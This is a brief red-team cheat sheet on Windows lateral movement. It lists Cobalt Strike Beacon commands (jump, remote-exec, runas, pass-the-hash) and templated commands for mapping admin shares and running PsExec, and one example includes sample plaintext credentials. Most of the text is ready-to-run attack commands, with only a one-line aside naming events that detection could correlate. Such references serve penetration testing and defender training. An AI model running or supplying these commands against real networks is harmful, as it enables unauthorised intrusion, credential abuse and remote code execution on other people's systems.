# Lateral Movement

* [Remote Service Session Hijacking: RDP Hijacking]
* [Use Alternate Authentication Material: Pass the Hash]
* [Remote Services: Windows Remote Management]
* [Remote Services: Distributed Component Object Model]
* [Remote Services: SMB/Windows Admin Shares]
* [using Cobalt Strike]


## Using Cobalt Strike

### Jump
Jump will spawn a Beacon payload on the remote target.

```
beacon> jump [module] [target] [listener] 
```

### Remote-exec
The remote-exec module will use the current delegation/impersonation token to authenticate on the remote target.

```
beacon> remote-exec [psexec,winrm,wmi] [target] [command+args] 

beacon> remote-exec winrm [target] (Get-WmiObject win32_operatingsystem).OSArchitecture
```
Note:
To test local admin access on a target is list C$ share remotely. To build a  detection, we can correlate event such as:
* File creation
* Service installed
* process started

### Runas
A wrapper of runas.exe, using credentials you can run a command as another user.

```
beacon> runas [DOMAIN\user] [password] [command] [arguments
```

### Pth
By providing a username and a NTLM hash you can perform a Pass The Hash attack. This module needs Administrator privileges.

```
beacon> pth [DOMAIN\user] [hash]
```
## Remote Services: SMB/Windows Admin Shares 

### map-admin-share

```
cmd.exe /c "net use \\#{computer_name}\#{C$|IPC$|Admin$} #{password} /u:#{DOMAIN\Administrator}"

New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
```

### Psexec

Copies a file to a remote host and executes it using PsExec.

```
#{psexec_exe} #{remote_host} -accepteula -c #{command_path}

psexec \\10.10.10.10 -accepteula -i -u TECH\goku -p gokupass123 cmd.exe

```
